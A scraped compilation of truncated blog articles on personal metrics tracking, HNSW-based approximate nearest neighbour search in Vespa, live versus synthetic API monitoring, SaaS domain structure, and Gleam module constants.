<li>Activity (daily pushups and situps, stretching, exercise)</li>
<li>Condition (ARHR, sleep, VO2m, weight, trajectory)</li>
<li>Nutrition (meal quality, fasting, calories in/out, deficit)</li>
<li>Personal habits (reading to kids; alcohol intake)</li>
<li>Revenue (passive, billings, 30-day averages)</li>
<li>Startup activity (installs, MRR, outreach, traffic)</li>
</ul>
<p>Each day gets one row, with a column for each of the items noted above. I also keep one cell for notes. Most times this is empty but does come in handy at times. For example, if I’m away from home, I’ll use my most recent 7-day weight average. I then write: “Away; weight estimated” in the Notes cell. </p>
<h2>Observations</h2>
<p>This experience might be the longest personal experiment I’ve ever undertaken. Over the year, I learned a lot from it and collected some notes. The following are ones that stand out. I’ll return to this list and add to it, should other points come to mind.</p>
<h3>One habit leads</h3>
<p>For me, collecting metrics is a keystone habit (Charles Duhigg talks about this in <em>The Power of Habit</em>). So, I document metrics near the beginning of each day. I seldom miss a day. In the odd case that I do, I’m ill-at-ease until I’ve filled in those cells.</p>
<p>This is telling. Metrics are in part about establishing positive habits and removing negative ones. For me, this makes measuring my habits my most important habit—and I stick to it.</p>
<h3>Manual matters</h3>
<p>My first successful metrics experience related to finances. Ours weren’t where they should be, so I set aside a weekend (~4 years ago) to create a better system. I collected every expense from the previous 6 months, sorted them into groups, and averaged them. This allowed me to see our monthly expenditures. It also helped me predict costs for upcoming months.</p>
<p>This resulted in a finances spreadsheet. Every day, I manually document our bank and credit card transactions in it. Every month, I copy-and-paste the monthly template for the next month. This process allows me to track our accounts for anomalies. It helps me spot potential shortfalls. It also indicates when I can set aside surplus funds for savings.</p>
<p>Could I automate most of this with personal finance software? Yes. But, it’d distance me from the process. That extra step of documenting expenses manually only adds a few minutes to my day. In exchange for that time I gain a sense of control that I value. </p>
<p>This approach also allows for customization. For example, I fill cells with positive actions (going for a run) or key milestones (a new MRR record) in green. This sounds trivial, but it’s not. These act like gold stars and provide tiny dopamine hits that affect my behavior.</p>
<figure><img src="http://www.erickarjaluoto.com/wp-content/uploads/2020/03/bully-maintains-streak.png" alt="" srcset="http://www.erickarjaluoto.com/wp-content/uploads/2020/03/bully-maintains-streak.png 1200w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/bully-maintains-streak-500x500.png 500w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/bully-maintains-streak-1024x1024.png 1024w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/bully-maintains-streak-150x150.png 150w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/bully-maintains-streak-768x768.png 768w" sizes="(max-width: 1200px) 100vw, 1200px"></figure>
<h3>I can predict the future</h3>
<p>Much like I can predict our finances by documenting patterns, I can do so with personal matters. I once wrote that you <a href="http://www.erickarjaluoto.com/blog/why-you-shouldnt-step-on-the-scale/" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">shouldn’t step on the scale</a>. I was wrong. A better position would have been: Don’t let today’s measurement derail your progress.</p>
<p>My weight fluctuates up to five pounds over 24 hours. This is in part because I practice alternate-day <a href="http://www.erickarjaluoto.com/blog/i-lost-one-pound-for-every-year-of-my-life/" target="_blank" rel="noreferrer noopener" aria-label="fasting (opens in a new tab)">fasting</a>. (I recognize that fasting seems extreme to some, but I find it manageable and productive.) Daily scale readings aren’t that informative. So, I tally the last week’s readings and divide the sum by 7. Doing so gives me my 7-day average. From this I see a pattern.</p>
<p>So long as I practice the same behaviors, my weight tends to follow a clear trajectory. This also allows me to calculate daily average weight loss. From this, I can extrapolate my approximate weight a week, month, or 6 months down the road. This isn’t an exact science, but it is quite useful.</p>
<h3>Data doesn’t lie (sort of)</h3>
<p>Last fall my weight loss hit a standstill. This frustrated me. Around the same time, a friend noted that weight loss involves plateaus. (I also found mention of this on Reddit.) So, I shrugged my shoulders and thought to myself, “I’ve plateaued. I guess this is as far as I go.”</p>
<p>A few weeks later, though, I took a closer look at my metrics. It turned out that I had gotten a little lax about food intake. In fact, I was up by around 500 calories a day. This wasn’t enough for me to put on weight—but it also wasn’t enough for me to drop weight.</p>
<p>I don’t want you to think that I’m obsessed with weight loss. Yet, it’s a useful way to examine how habits and tracking work—because it allows me to measure outcomes so easily.</p>
<p>We often make up reasons for why something doesn’t work. Data helps me overcome these preconceptions. It also sets me up to better assess what’s actually happening.</p>
<h3>Measurement spurs action</h3>
<p>I make a point of implementing a couple of small rituals aimed at creating more time with my kids. One is a nightly bedtime story. The problem is that by 9:00 PM, I’m beat. This leads me to put off reading, reasoning that we can do it the next night. The next night is often the same.</p>
<p>I know the boys are getting old for bedtime stories. I’m glad they take part in them now but recognize they won’t for much longer. So, I track each night I read to them. Doing so is a small act, but it serves as a daily reminder about whether I’m making time for something that matters. The longer I track such things, the more I tend to see my behavior shift. </p>
<h3>Streaks have limits</h3>
<p>A lot of folks believe in the power of streaks. This practice involves setting a habit and tracking its completion each day. Most times folks use a streaks tool or calendar to do this. The plan is to create a habit by not breaking the streak. I like this idea but it doesn’t work for me.</p>
<p>My problem with streaks is that breaking one is demoralizing. It is so much so that it stops me from starting another. I felt this most after 104 days of abstaining from alcohol. We were at a fundraiser, and I thought ”I’ve been good. Why not treat myself to a glass of wine?” The next day, I had to start my count again from 1. Bummer! Actually, more than that—I felt like I had thrown away all that discipline.</p>
<p>So, I adapted streaks to work better for me. Now, I track every day I don’t drink over the year. This means that if I slip one day, it’s OK. I haven’t lost my count for the year. I enjoy the break and start again the next day. This reduces the sense of failure and lowers the emotional cost of restarting.</p>
<h3>Exercise works faster than I expected</h3>
<p>I always figured that you needed to do a lot of exercise before you saw results. To my surprise, I found the opposite this year. For example, a week of short runs every morning can drop my average resting heart rate (ARHR) by 10 beats a minute. On a bit longer of a timeline, I saw my VO2 max increase by 15% over six months with moderate activity.</p>
<p>These aren’t super-impressive numbers. Yet, they make me optimistic about how much I could achieve if I applied myself. I’m also quite excited by the gains I saw by adding a small amount of interval training. This seemed to pay off within only days.</p>

<h3>Metrics evolve</h3>
<p>I started out thinking that my metrics collection method needed to be perfect. In fact, this idea got in the way of me starting. Turns out it’s not the case. The act of collecting metrics is the important part. Once you start you can retool as you see what works or doesn’t.</p>
<p>For example, I tracked daily steps for a long time. I didn’t find this information that useful (because it doesn’t accommodate my cycling or skiing.) I also tried to make a habit of cold showers and drinking matcha tea. Neither of these stuck either—so, I removed them.</p>
<p>I figure it’s reasonable for a document like this to evolve. I do version the file when I make significant changes, though. This allows me to roll it back if I change my mind.</p>
<h3>Persistent action delivers</h3>
<p>Collecting metrics taught me that small matters add up to significant outcomes. These are for both the better and for the worse. You don’t put on weight through one night of binging. You do so with just one beer a night.</p>
<p>Think of this way: On a sedentary day, I burn ~2,200 calories. That’s not a lot. If I manage to stay under that number and add one beer a day, I’ll quickly find the number on my scale moving upward. But, removing 200 calories from my allotment of 2,200 has the opposite …</p></div></div></div></div>

                <p>Searching for the nearest neighbors of a data point in a high dimensional vector space is an important problem for many real-time applications.
For example, in Computer Vision it can be used to find similar images in large image datasets.
In Information Retrieval, pre-trained text embeddings can be used to match documents based on the distance between query and document embeddings.
In many of these applications,
the document corpus is constantly evolving and the search is constrained by query filters applied on the metadata of the data points.
For example, in E-commerce,
a nearest neighbor search for products in a vector space would typically be constrained by product metadata like inventory status and price.</p>

<p><a href="https://vespa.ai/">Vespa</a> (the open source big data serving engine) already supports exact
<a href="https://docs.vespa.ai/documentation/nearest-neighbor-search.html">nearest neighbor search</a>
that is integrated with the Vespa query tree and its filter support.
This enables you to get the exact nearest neighbors meeting the filter criterias of the query.
This works well when the number of documents to calculate nearest neighbors for is small,
e.g when the query filter is strong, or the document corpus is small.
However, as the number of documents to consider increases, we want to trade exactness for performance and we need an approximate solution.</p>

<p>This blog post is part 1 in a series of blog posts where we share how the Vespa team implemented an approximate nearest neighbor (ANN) search algorithm.
In this first post, we’ll explain why we selected HNSW (Hierarchical Navigable Small World Graphs)
as the baseline algorithm and how we extended it to meet the requirements for integration in Vespa.
Requirements included supporting real-time updates, integration with the Vespa query tree, and being flexible enough to fit a wide range of use cases.</p>

<h2 id="requirements--challenges">Requirements &amp; Challenges</h2>
<p><a href="https://vespa.ai/">Vespa</a> is an open source real-time big data serving engine.
In a typical application, the document corpus is constantly evolving.
New documents are added and removed, and metadata is being updated.
A typical use case is news article search and recommendation, keeping a week, month or year’s worth of articles,
continually adding or updating new articles while selectively removing the oldest ones.
In this case, nearest neighbor search over pre-trained text embeddings could be used in combination with query filters over metadata.</p>

<p>Based on the existing functionality and flexibility of Vespa,
we defined a set of requirements an ANN search algorithm had to support to be a good fit for integration:</p>
<ul>
  <li>Indexes used in the algorithm must be real-time updateable with low latency and high throughput.
Data points can be added, updated and removed, and the entire corpus should not be needed when creating the index.</li>
  <li>Concurrent querying with low latency and high throughput without huge performance impact due to ongoing update operations.</li>
  <li>Seamless integration with the Vespa query tree and its filter support.
This enables correct results, compared to just increasing top K for the nearest neighbor search algorithm to compensate when query filters are used.</li>
</ul>

<h2 id="algorithms-background">Algorithms Background</h2>
<p>There exists a lot of algorithms for ANN search.
Many of these are summarized and analyzed in
<a href="https://arxiv.org/abs/1610.02455">Approximate Nearest Neighbor Search on High Dimensional Data — Experiments, Analyses, and Improvement (v1.0)</a>
and
<a href="https://arxiv.org/abs/1612.07545">A Revisit of Hashing Algorithms for Approximate Nearest Neighbor Search</a>.
In addition, benchmark results for different algorithms over different datasets are summarized in
<a href="http://ann-benchmarks.com/">ANN Benchmarks</a>.</p>

<p>Existing algorithms are mainly focused on a stable document corpus where all data points in the vector space are known up front.
In this case the index structure is built once, and then used for nearest neighbor searches.
To support real-time updates, we looked for algorithms that were either incremental in nature or could be modified to meet this requirement.</p>

<p>There are three broad categories of algorithms: tree-based, graph-based and hash-based.
We choose one from each category for a more detailed exploration.
This selection was based on how they performed in benchmarks within papers and in
<a href="http://ann-benchmarks.com/">ANN Benchmarks</a>,
and how easy the algorithm was to modify to fit our requirements.</p>

<p>We ended up with the following:</p>
<ul>
  <li><strong>Annoy</strong><br>
Annoy is tree-based and described in
<a href="https://erikbern.com/2015/10/01/nearest-neighbors-and-vector-models-part-2-how-to-search-in-high-dimensional-spaces.html">Nearest neighbors and vector models – part 2 – algorithms and data structures</a>.
It takes a straightforward engineering approach to the ANN problem, and is quite easy to understand and implement.
An Annoy index consists of N binary trees, where each tree partitions the vector space using random hyperplanes at each node in the tree.
The implementation is available on <a href="https://github.com/spotify/annoy">github</a>.</li>
  <li><strong>HNSW - Hierarchical Navigable Small World Graphs</strong><br>
This is graph-based and described in
<a href="https://arxiv.org/abs/1603.09320">Efficient and robust approximate nearest neighbor search using Hierarchical Navigable Small World graphs</a>.
HNSW builds a hierarchical graph incrementally,
and has great search performance with high recall, motivating us to prototype it for comparison.
Each node in the graph represents a point in the vector space, and nodes are linked to other nodes that are close in space.
The implementation is available on <a href="https://github.com/nmslib/hnswlib">github</a>.</li>
  <li><strong>RPLSH - Random Projection based Locality Sensitive Hashing</strong><br>
This is hash-based and described in
<a href="https://arxiv.org/abs/1612.07545">A Revisit of Hashing Algorithms for Approximate Nearest Neighbor Search</a>.
The implementation is available on <a href="https://github.com/ZJULearning/RPLSH">github</a>.
Since the random hyperplanes used for projections can be selected up-front
(only depending on the number of dimensions of the vector space) this approach is data-independent.
For our purposes, we could use the hash value as a filter,
where only documents having most bits in common with the hash value of the query data point would be considered for full distance computation.
This would give us very little extra memory and CPU usage and would be easy to fit into our exact (brute-force) nearest neighbor feature.
It was the first algorithm that we implemented as a prototype.
However, in our prototype we found that getting a significant speedup required a large sacrifice of quality.
For more info, see <em>Dropping RPLSH</em> below.</li>
</ul>

<p>We created prototype implementations of the three algorithms in C++.
This gave us a deeper understanding and the ability to make necessary modifications to support real-time updates and query filters.
The prototypes were also used to do low-level benchmarking and quality testing.</p>

<h2 id="prototype-benchmark">Prototype Benchmark</h2>
<p>We benchmarked the three prototype implementations to look at indexing throughput and search throughput with different document corpus sizes.
We used the
<a href="http://corpus-texmex.irisa.fr/">1M SIFT (128 dim)</a>
and
<a href="http://corpus-texmex.irisa.fr/">1M GIST (960 dim)</a>
datasets, where one vector corresponds to a document.
In this section, we summarize the results of the 1M SIFT tests. Findings were similar with the 1M GIST dataset.</p>

<h3 id="setup">Setup</h3>
<p>The tests were executed in a CentOS 7 Docker image using Docker Desktop on a MacBook Pro (15 inch, 2018)
with a 2.6 GHz 6-Core Intel Core i7 CPU and 32GB of memory. The Docker setup was 8 CPUs, 16GB of memory and 1GB of Swap.</p>

<p>The configuration of the algorithms were as follows:</p>
<ul>
  <li><strong>Float size</strong>: 4 bytes.</li>
  <li><strong>Annoy</strong>: Number of trees = 50. Max points in leaf node = 128.</li>
  <li><strong>HNSW</strong>: Max links per node (M) = 16. Note that level 0 has 32 links per node (2*M). Number of neighbors to explore at insert (efConstruction) = 200.</li>
  <li><strong>RPLSH</strong>: 512 bits used for hash and linear scan of hash table.</li>
</ul>

<h3 id="indexing-throughput">Indexing Throughput</h3>
<p>The 1M SIFT dataset was split into chunks of first 100k, 200k, and 500k vectors,
and indexing throughput was tested with different corpus sizes.
The index structures for all algorithms started empty, and we added one document at a time to simulate real-time feeding.
One thread was used. Necessary adjustments to the prototype implementations were done to accommodate this.
Note that the data points for 10M documents are estimated based on the 100k and 1M data points.</p>

<p>Observations:</p>
<ul>
  <li>Indexing throughput depends on corpus size for Annoy and HNSW, where throughput is halved when corpus size is increased by 10x.</li>
  <li>Indexing throughput for RPLSH is independent of corpus size.</li>
  <li>Annoy is <strong>4.5 to 5 times</strong> faster than HNSW.</li>
  <li>RPLSH is <strong>23 to 24 times faster</strong> than HNSW at 1M documents.</li>
</ul>

<h3 id="search-throughput-qps">Search Throughput (QPS)</h3>
<p>The search throughput was measured after the indexes were built, using a single benchmarking client and search thread.
We used the query vectors from the dataset, and searched for the nearest K=100 neighbors from the query vector.
To get comparable quality results between the algorithms we had to adjust some of the parameters used.
The default behavior for Annoy is to collect K=100 candidates per tree, and then calculate brute force distance for all those.
To get comparable quality between Annoy and HNSW we had to collect 8000 candidates instead of 5000.
For RPLSH, we used the Hamming distance between hashes to pre-filter candidates after collecting 200 candidates into a heap,
skipping full distance calculation for most candidates. For HNSW, we asked for 100 candidates.</p>

<p>Observations:</p>
<ul>
  <li>HNSW outperforms Annoy and RPLSH. At corpus size 1M the QPS is <strong>9 times as high</strong> as Annoy,
and <strong>16 times as high</strong> as RPLSH at comparable quality.
Similar observations between hnswlib and Annoy are found in <a href="http://ann-benchmarks.com/">ANN Benchmarks</a>,
where the QPS of hnswlib is 5-10 times higher at the same quality on all tested datasets.</li>
  <li>The HNSW search algorithm depends heavily on the number of links between nodes, which again depends on corpus size.
The QPS is halved when the corpus size is increased by 10x.
We see the same during indexing as that uses the search algorithm to find candidates to connect to.</li>
  <li>The Annoy search algorithm is less dependent on corpus size, at least with small corpus sizes.
The static cost is driven by brute force calculation of distances for the candidate set, 8000 in this case.
With very high corpus size the cost of traversing the binary trees will likely match and exceed the static cost.
We don’t know where this limit is.</li>
  <li>For RPLSH, doing exhaustive …</li></ul></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-post-content=""><p>Application development is increasingly dependent upon APIs, often integrating with many different services. To address uncertainty in these dependencies, many developers use synthetic tests to monitor their API activity. This common tooling helps you discover when an API is up or down, and whether it’s returning the expected results. While useful, synthetic testing cannot mimic the reality of today’s applications.</p>
<p>When your application uses multiple services, your tests will miss:</p>
<ul>
<li>Internal microservices that don’t have public endpoints</li>
<li>Errors specific to real usage that you haven’t foreseen</li>
<li>Changes to your application after the tests are written</li>
</ul>
<p>In this post, we’ll share more about these three scenarios, and explain why real-time monitoring of live API calls is the best solution.</p>
<h2>Your Microservices Might Be Untestable</h2>
<p>Traditional synthetic testing isn’t even an option for many enterprises today. If you’re building internal APIs that are not Internet-accessible, such as popular microservices architectures, you’ll be restricted to only public interfaces. Sometimes that is enough, but for sufficiently advanced use cases, it typically means you’re leaving much of your software untested.</p>
<p>Most synthetic monitoring tools run as SaaS. You log in to a dashboard and set up your series of API calls and criteria. Then, at defined intervals, the monitor calls the endpoints—typically from cloud providers in various locations—to ensure the synthetic tests pass. To achieve this test with microservices requires that the calls can be made from within your systems, which may not be accessible by public DNS.</p>
<p>You may be able to use synthetic monitoring with simpler scenarios:</p>
<ul>
<li>An internal API running a mobile app or other frontend</li>
<li>Calling a small number of third-party APIs</li>
</ul>
<p>In both of these cases, the endpoints must be accessible to the Internet. With some manual effort, you could create tests to periodically mimic these client-side calls. With this approach, you can only monitor pre-determined request and response data to ensure it matches expectations. Not only does this testing miss issues with internal services, it also only gives you a partial view of your external calls.</p>
<h2>Synthetic Monitoring Only Tells Part of the Story</h2>
<p>The problem with synthetic monitoring is in the name: it’s synthetic. You are only testing what you’ve explicitly included. Many errors are dependent upon real usage situations—if you haven’t accounted for it, your monitoring will not catch it.</p>
<p>Synthetic tests can miss:</p>
<ul>
<li>Problems related to your application’s network</li>
<li>Edge cases based on the credentials you use</li>
<li>Bugs that only arise with dynamic request content</li>
<li>Latency not captured in a one-off test</li>
<li>Error messages sent with 200-level status codes</li>
<li>Issues you have not considered with your tests</li>
</ul>
<p>These issues only become worse if your application depends on multiple third party APIs. We found <a href="https://www.hoss.com/blog/api-consumption-insights/" target="_blank" rel="nofollow noopener noreferrer">over half of developers consume more than five APIs</a>. With the many potential points of failure, you can see why it’s tempting to set up monitors. Yet, we discovered most developers don’t monitor the external APIs they call and may not have access to a sandbox that can be easily tested.</p>
<p>To understand the full picture into API performance requires total visibility to what your application is experiencing. There are situations where synthetic tests make sense, but you cannot depend on them to capture all the issues with your application.</p>
<p>If it’s important for your customers to have an experience with limited errors, it’s critical that you go beyond synthetic tests. </p>
<h2>It’s Hard to Maintain Synthetic Tests</h2>
<p>Where synthetic monitoring makes sense is for APIs that you provide publicly or for approved partners. The surface area of tests is limited to a single API with some well-defined use cases. Third-party API monitoring is more difficult, especially if you try to cover some of the scenarios synthetic tests can miss. External <a href="https://www.hoss.com/blog/3-common-api-Integration-mistakes-and-how-to-avoid-them/" target="_blank" rel="nofollow noopener noreferrer">APIs often change without notice</a>, so tests can give you alerts when things aren’t as you expect. Then comes the hardest part: maintenance of those tests when your own app is also changing.</p>
<p>Let’s say you’ve gathered the details of every API call you make during a typical user’s experience with your application. Next, you translate those use cases into synthetic tests, so you can be alerted when it catches errors. You’ll be missing atypical user paths, but that may be a trade-off you want to make. You can publish your tests and monitor them regularly, feeling somewhat confident. As long as you don’t change anything.</p>
<p>Once you’ve built an application, it’s not done. Most software requires bug fixes, user experience enhancements, and new features. Inevitably, you’ll need to adapt how you make your calls to external APIs. Building comprehensive synthetic tests for an application that calls multiple APIs is difficult in the first place. Keeping it updated with the exact calls as your code evolves might be an impossible task.</p>
<p>Ideally, you could add some process to sync monitors with your real calls. For example, include synthetic test maintenance in your code review. An unfortunate side effect could be slower development cycles. All in the name of tests that can’t even capture every scenario.</p>
<h2>Use Real Monitoring for Real Visibility</h2>
<p>We’ve bumped into all these issues, in our development work and with Hoss customers. Whether consuming your own microservices or third party APIs, our goal is to give you <a href="https://www.hoss.com/" target="_blank" rel="nofollow noopener noreferrer">deep visibility and better customer experiences</a>. Keep track of performance based on real scenarios, not synthetic tests. You can enable error alerts and reduce the amount of time spent debugging your integrations.</p>

<![CDATA[Domain Structure for SaaS Products]]>

July 1, 2020 | https://ghinda.com/blog/products/2020/domain-structure-for-saas-products.html | <a href="https://web.archive.org/web/*/https://ghinda.com/blog/products/2020/domain-structure-for-saas-products.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>While being involved in a couple of side-projects in the last months, all of the SaaS products, I had to discuss and choose the domain architecture.</p>

<p><img src="https://ghinda.com/blog//assets/images/articles/domain-structure-full.png" alt="Domain structure for SaaS Products"></p>

<p>First, let me introduce some concepts:</p>

<ul>
  <li>Marketing website is the main website of the SaaS product dedicated mostly for attracting new customers. It is dedicated to convincing visitors to become customers, to tell a story about the product, to present showcases.</li>
  <li>product app (or SaaS app) is the actual product that is used by customers (logged in users).</li>
</ul>

<p>When I say domain architecture, I am referring to the following choices:</p>

<ol>
  <li>
    <p><strong>Should the marketing website be part of the same codebase as the product app, or should these two sites live in different codebases having their independent release cycles?</strong></p>
  </li>
  <li>
    <p><strong>Should the domain structure for the marketing website and product app be based on subdomains (like example.com and app.example.com) or based on pathnames (like example.com and example.com/app)?</strong></p>
  </li>
</ol>

<p>There is another question in case you want to offer to your customers an URL a slug (a namespace) when using your product app:</p>

<ol start="3">
  <li><strong>Should you offer the slug as a subdomain (like organisatio-namespace.example.com) or as a part of the pathname  (like example.com/organisation-namespace)?</strong></li>
</ol>

<p>Bonus question:</p>

<ol start="4">
  <li><strong>Should the blog be on a subdomain (like blog.example.com) or as a subfolder (like example.com/blog)?</strong></li>
</ol>
      <h2 id="my-recommendations">
        
        
          My recommendations <a href="#my-recommendations">#</a>
        
        
      </h2>

<p>Here are my answers to these questions:</p>

<ol>
  <li>
    <p>Use separate codebases for the product app and marketing website. Also, deploy them on separate machines. This results in less downtime when releasing them, almost no common bugs, and allowing different experiments on each one of them without the fear of affecting customers. Don’t use this when you want to display in your marketing websites live data from the product app.</p>
  </li>
  <li>
    <p>Use a subdomain structure for the separation between the marketing website and product app. This creates greater flexibility in how you generate routes for both of them (due to domain separation),  it allows you to configure CDN or separate traffic between them easily. You get a small security bonus when using per-domain settings.</p>
  </li>
  <li>
    <p>Use organization slug as a pathname, not as a subdomain. It makes the use of SSL much easier, and you have less work to do to set up organization accounts. For this, you lose the ease to route your customers to different machines based on their URLs, and it pollutes your sitemap. You need to be careful when adding routes to your marketing website not to use any customer slug.</p>
  </li>
  <li>
    <p>For this last question, the current recommendation is still to use a subfolder for your blog.</p>
  </li>
</ol>

<p>You can read more about why I recommend these at the end of this article.</p>
    <hr>

<p>Let’s go and explore the advantages and disadvantages of each strategy.</p>

<p>I explore what kind of recommendations I found at the first search and then try to give my own arguments for this.</p>

<p><em>1. IndieHackers Discussion</em></p>

<p><a href="https://www.indiehackers.com/forum/questions-for-saas-founders-0519d4f95e" target="_blank" rel="noopener">Here</a> is an interesting discussion about organizing the domain structure of a SaaS. This discussion is mainly referring to how to organize the main website (marketing website) with</p>

<p>In that thread there are proposed 2 solutions:</p>

<p>A. Main website on example.com and SaaS product at subdomain.example.com like:</p>
<ul>
  <li>Main website or marketing website at <code>https://example.com</code>
</li>
  <li>SaaS app living at subdomain.example.com, with the following examples:
    <ul>
      <li><code>app.example.com</code></li>
      <li><code>dashboard.example.com</code></li>
      <li><code>admin.example.com</code></li>
      <li><code>my.example.com</code></li>
    </ul>
  </li>
</ul>

<p>B. Main website at example.com and SaaS product living at example.com/folder  like:</p>
<ul>
  <li>Admin at <code>example.com/admin</code>
</li>
  <li>App at <code>example.com/dashboard</code>
</li>
  <li>Blog at <code>example.com/blog</code>
</li>
  <li>API at <code>example.com/api</code>
</li>
</ul>

<p>The main reasons for going for subdomain structure (option A):</p>

<p>a. SEO concern: when the SEO is important only for the marketing website and when the SaaS product itself, it is not part of the SEO strategy and should not be indexed.</p>

<p>b. It is easy to segment the traffic in case of heavy load and assure some kind of QoS</p>

<p>c. It is easy to setup Cloudflare or CDN when traffic increases when a subdomain structure</p>

<p>d. It is easy to setup difference services like example.com to <a href="https://www.netlify.com/" target="_blank" rel="noopener">Netlify</a>, app.example.com to <a href="https://www.heroku.com/" target="_blank" rel="noopener">Heroku</a> and blog.example.com to <a href="https://write.as/pro" target="_blank" rel="noopener">Write.as</a> for example.</p>

<p>d. Improved security by separation of concerns, even it is not clear there is the security is better only because of the subdomain structure, or it is a side effect of hosting them on difference resources</p>

<p>The main reason for choosing the folder structure (option B):</p>
<ol>
  <li>When there is a need to share data between the SaaS product and marketing website for SEO  (like the number of users who applied so far …)</li>
  <li>Keeping everything in the same codebase facilitates code reuse thus increasing productivity</li>
  <li>Speed of development and fewer ops needed to maintain the infrastructure</li>
</ol>

<p><em>2. Clubhouse article about using a single subdomain</em></p>

<p><a href="https://clubhouse.io/blog/building-a-saas-app-you-should-probably-stick-to-a-single-subdomain-455695e1d03c/" target="_blank" rel="noopener">Here</a> is the article from Clubhouse written by Andrew Childs, Chief Design Officer and Co-founder of Clubhouse.</p>

<p>Here is a quote from that article explaining their recommendation:</p>
<blockquote>
  <p>If you’re building a SaaS app that has any third-party OAuth integrations, or your product allows a user to switch between multiple organizations, you should put the organization in the pathname and use a single subdomain (like “app”) for your application.</p>
</blockquote>

<p>Key takeaways from the article:</p>
<ol>
  <li>Having the organization slug  in the pathname makes it easier to switch organizations and to work with different URLs in dev/staging and production</li>
  <li>It is easier to whitelist the domain in case you are working with OAuth providers (as you only need to whitelist a single domain). In this case, you don’t need to rely on third-party providers to support wildcard domains.</li>
  <li>It allows us to get an Extended Validation SSL certificate as these are not assigned to wildcard domains.</li>
</ol>

<p><em>3. Winderwind - How to select a future-proof subdomain structure</em></p>

<p>Source of the article is <a href="https://winterwindsoftware.com/how-to-select-a-future-proof-subdomain-structure-for-saas-web-app/" target="_blank" rel="noopener">here</a></p>

<p>The article recommends the following structure:</p>
<ol>
  <li>The marketing website should be on the main domain and separated from the product app</li>
  <li>The product app should live on its own subdomain. Here are some suggestions from the article:
a. <em>dashboard</em> – Used by  <a href="https://stripe.com/" target="_blank" rel="noopener">Stripe</a> 
b. <em>manage</em> – Used by  <a href="https://gocardless.com/" target="_blank" rel="noopener">GoCardless</a> 
c. <em>portal</em> – This is what I use for  <a href="https://autochart.io/" target="_blank" rel="noopener">Autochart</a> 
d. <em>my</em> – Used by  <a href="https://www.xero.com/" target="_blank" rel="noopener">Xero</a> 
e. <em>account</em> – Used by  <a href="https://postmarkapp.com/" target="_blank" rel="noopener">Postmark</a> 
f. <em>secure</em> – Used by  <a href="https://helpscout.net/" target="_blank" rel="noopener">HelpScout</a>
</li>
  <li>Keep the marketing site and the blog on the same domain</li>
  <li>Keep the API on the same subdomain as the product app</li>
</ol>

<p>Reasons for separating the marketing website and product app from the article are:</p>
<ol>
  <li>It makes it easy to work with non-technical people on the marketing website and minimizes downtime when upgrading them</li>
  <li>It allows using static CDN for the marketing website</li>

          Use separate codebases for product app and marketing website <a href="#use-separate-codebases-for-product-app-and-marketing-website">#</a>

          Reasons for separate codebase <a href="#reasons-for-separate-codebase">#</a>
        
        
      </h4>

<p>Even if you are a single owner of your project, it makes sense to have this split between codebases because it will first and foremost make sure bugs don’t leak between these two components. Imagine a bug in your CSS/JS flow while trying to fix something on the marketing website that might impact your customers who are using your product app. It makes the testing easier because you can have different test coverage and test thoroughness, allowing you, for example, to say that the marketing website should only pass several N positive scenarios without being concerned with negative scenarios.</p>

<p>The second biggest advantage is having different release schedules between them. You can play more easily with the marketing website (A / B testing, testing copywrite, SEO tags) and release them as often as you like without any (let’s say this again without any) concern for a possible effect of your existing customers of the product app. It decreases downtime for users of the product app. You don’t need to restart product app services each time you want to add/change/remove a text from the marketing website.</p>

<p>The third advantage is related to the ability to use different frameworks and languages for marketing website than for the product app, thus allowing you also to use different hosting services if you like without having to create a complicated release process. You can decide to make your marketing website a static website generated by Jekyll or Middleman or Ghost and then release it to Netlify while using Ruby or Python or Elixir for your product app and host them on AWS or Heroku or Digital Ocean.</p>
    
      <h4 id="concerns-against">
        
        
          Concerns against <a href="#concerns-against">#</a>
        
        
      </h4>

<p>First, DO NOT DO separate codebases if you plan to show live data (or as fresh as possible) in your marketing website from your product app (like the number of accounts created so far …). In this case, you need to create and maintain an API server and client with maybe authentication or at least a security layer, and there is no need for this.</p>

<p>The biggest concern is related to the branding synchronization among the two projects. You need to have consistent branding (using the same colors, fonts, sizes, elements). This impairs your speed when changing these attributes. For this, there is no quick fix. 
What can be done is creating a separate project where you maintain your CSS and JS, maybe also some HTML components, and then use two in your two projects. Of course, this comes with extra maintenance overhead.</p>

<p>The second concern is the overhead needed to maintain two codebases and their release scripts. There is, in the beginning, a small overhead to setup CI/CD for both projects with most of the time spent into creating the automated testing environment.</p>

<p>The third concern is code reuse, especially if you are using the same …</p></div></div>

      <p>1 month and 10,910 lines of code later it is time for another Gleam
release! Let’s see what’s new this time.</p>

<h2 id="module-constants">Module constants</h2>

<p>Sometimes we want to use a certain fixed value in multiple places in our
project. Until now we’ve had two options. The first option was to copy and
paste the value into multiple places in our code.</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>is_before</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>Bool</span> <span>{</span>
  <span>year</span> <span>&lt;</span> <span>2101</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>is_during</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>Bool</span> <span>{</span>
  <span>2101</span> <span>&lt;=</span> <span>year</span> <span>&amp;&amp;</span> <span>year</span> <span>&lt;=</span> <span>2111</span>
<span>}</span>
</code></pre></div></div>

<p>Duplication of values like this is error prone, especially if we want to
update the values later, as we’ll need to find every place it’s used in order
to change it.</p>

<p>Another option is to wrap the value in a function.</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>start_year</span><span>()</span> <span>-&gt;</span> <span>Int</span> <span>{</span>
  <span>2101</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>end_year</span><span>()</span> <span>-&gt;</span> <span>Int</span> <span>{</span>
  <span>2111</span>

<span>}</span>
</code></pre></div></div>

<p>This is better than copying the value in our code, but isn’t yet ideal. A
function can perform any amount of computation (with side effects!) when it is
called, so we have to read the definition of the function to be sure what it
does.</p>

<p>To make matters worse Gleam’s case clause guards don’t support calling of
functions within them, so this code will be rejected by the compiler:</p>

